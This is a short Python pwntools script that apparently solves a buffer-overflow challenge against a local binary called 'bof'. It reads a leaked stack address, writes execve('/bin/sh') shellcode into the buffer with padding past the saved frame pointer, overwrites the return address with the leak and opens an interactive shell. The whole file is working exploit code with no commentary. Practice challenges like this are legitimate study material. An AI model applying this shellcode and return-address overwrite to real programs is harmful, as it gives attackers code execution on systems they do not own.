from pwn import *

r = process('bof')

leak = r.recvuntil('\n')[:-1]
leak = leak.decode('utf-8')
leak = int(leak, 16)

print(hex(leak))

shellcode = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

ex = shellcode + b'a'*(48-len(shellcode))    # buf
ex += b'a'*8  # sfp
ex += p64(leak)

r.sendline(ex)

r.interactive()




